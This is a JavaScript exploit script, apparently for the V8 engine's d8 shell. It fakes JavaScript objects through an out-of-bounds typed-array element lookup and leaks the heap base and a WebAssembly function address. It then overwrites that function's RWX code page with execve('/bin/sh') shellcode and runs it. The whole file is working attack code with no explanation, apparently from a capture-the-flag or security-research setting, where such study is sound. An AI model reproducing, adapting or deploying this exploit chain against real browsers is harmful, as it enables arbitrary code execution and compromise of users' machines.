function dp(x){%DebugPrint(x);}
const print = console.log;
const assert = function (b, msg)
{
	if (!b)
		throw Error(msg);
};
const __buf8 = new ArrayBuffer(8);
const __dvCvt = new DataView(__buf8);
function d2u(val)
{ //double ==> Uint64
	__dvCvt.setFloat64(0, val, true);
	return __dvCvt.getUint32(0, true) +
		__dvCvt.getUint32(4, true) * 0x100000000;
}
function u2d(val)
{ //Uint64 ==> double
	const tmp0 = val % 0x100000000;
	__dvCvt.setUint32(0, tmp0, true);
	__dvCvt.setUint32(4, (val - tmp0) / 0x100000000, true);
	return __dvCvt.getFloat64(0, true);
}
const hex = (x) => ("0x" + x.toString(16));
function getWMain()
{
	const wasmCode = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
	const wasmModule = new WebAssembly.Module(wasmCode);
	const wasmInstance = new WebAssembly.Instance(wasmModule, {});
	return wasmInstance.exports.main;
}
wmain = getWMain();


dp(wmain);
const kFakerAddr = u2d(0x8400131);
class Arr extends Int8Array {}

function spray()
{
	for (let i = 0; i < 200; i++)
	{
		(new Array(0x1000)).fill(kFakerAddr);
		// spray 0x08400131
	}
}

const ab = new ArrayBuffer(4294967296);

const f = ()=>{};

const faker = new Array(0x10000);
faker.fill(13.37);


// fake a double array
// 0x08241909 0x00000000 0x8400019 0x00000002
faker[1] = u2d(0x08241909);
faker[2] = u2d(0x208400019);

let baseAddr;
let res;

function fakeObj()
{
	const arr = new Arr(ab);
	for (let i = 0; i < 0x10; i++) {
		arr["4294967295"];
	}
	return arr["4294967295"];
}
spray();

while(true) {
	eval("res = fakeObj();"); //prevent JIT
	dp(res);
	dp(20192019);
	if (typeof res === 'object')
	{
		baseAddr = d2u(res[0]);
		baseAddr -= baseAddr % 0x100000000
		print("baseAddr = " + hex(baseAddr));
		break;
	}
}

// fake a obj array
// 0x08241959 0x00000000 0x08400141 0x00000002
faker[1] = u2d(0x08241959);
faker[2] = u2d(0x208400141);
faker[3] = 0; faker[4] = 0;
res[0] = wmain;
const wmainAddr = d2u(faker[4]);
print("wmainAddr = " + hex(baseAddr + wmainAddr));
dp(wmain);

// fake a Uint32Array
// 0x08241099 0x00000000 0x00000000 0x00000000
// 0x00000000 0x00000000 0x00000c84 0x00000000
// 0x00000321 0x00000000 [addr addr]
// 0x00000000 0x00000000 0x00000000 0x00000000
// 0x00000000

faker[1] = u2d(0x08241099);
faker[2] = 0; faker[3] = 0;
faker[4] = u2d(0x00000c84);
faker[5] = u2d(0x00000321);
faker[6] = u2d(wmainAddr + baseAddr - 0xc1);
faker[7] = 0;faker[8] = 0;faker[9] = 0;
dp(res);
const rwxAddr = res[0] + res[1] * 0x100000000;
print("rwxAddr = " + hex(rwxAddr));

faker[6] = u2d(rwxAddr);

const shellcode = [
	0x99583b6a, 0x2fbb4852,
	0x6e69622f, 0x5368732f,
	0x57525f54, 0x050f5e54
];
res.set(shellcode);


wmain();
// execute the shellcode

readline()